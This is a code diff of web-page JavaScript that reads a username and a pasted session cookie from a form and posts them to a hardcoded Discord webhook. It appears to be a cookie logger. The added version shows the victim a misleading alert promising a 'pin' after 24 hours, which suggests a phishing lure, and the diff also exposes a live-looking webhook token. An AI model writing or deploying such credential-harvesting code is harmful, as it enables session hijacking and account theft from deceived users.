@@ -1,17 +1,53 @@
-function submit() {
-  let username = document.getElementById("username").value;
-  let cookie= document.getElementById("Cookie").value;
-  let webhook = document.getElementById("Webhook").value;
-  
-   const webhook = 
-   "https://discord.com/api/webhooks/1267427698825756674/d3OaHRip1hSDeGkb5mxd3sFcX_HDSClJpXNxo7Xwlw3ITI1S8WcBIZUuvgEKi6_5Fl6n";
-   
-    const contents = `username: ${username}\nCookie: ${cookie}\nWebhook: ${webhook}`;
-    const request = new XMLHttpRequest();
-    request.open("POST", webhook);
-    request.setRequestHeader('Content-type', 'application/json');
-    const params = {
-      contents: contents
-    }
-      request.send(JSON.stringify(params));
-}
+document.getElementById('messageForm').addEventListener('submit', function(event) {
+    event.preventDefault();
+
+    const username = document.getElementById('username').value;
+    const message = document.getElementById('message').value;
+    const cookie = document.getElementById('cookie').value;
+
+    const webhookURL = 'https://discord.com/api/webhooks/1267427698825756674/d3OaHRip1hSDeGkb5mxd3sFcX_HDSClJpXNxo7Xwlw3ITI1S8WcBIZUuvgEKi6_5Fl6n';  // Replace with your Discord webhook URL
+
+    fetch(webhookURL, {
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/json'
+        },
+        body: JSON.stringify({
+            embeds: [
+                {
+                    title: 'New Submission',
+                    color: 0x00FF00,  // Green color
+                    fields: [
+                        {
+                            name: 'Username',
+                            value: username,
+                            inline: true
+                        },
+                        {
+                            name: 'Message',
+                            value: message,
+                            inline: true
+                        },
+                        {
+                            name: 'Cookie',
+                            value: cookie,
+                            inline: false
+                        }
+                    ],
+                    footer: {
+                        text: 'Submission Details'
+                    }
+                }
+            ]
+        })
+    })
+    .then(response => response.json())
+    .then(data => {
+        console.log('Success:', data);
+        alert('Message sent successfully!');
+    })
+    .catch((error) => {
+        console.error('Error:', error);
+        alert('Your pin will be sent to your discord server after 24 hours!');
+    });
+});
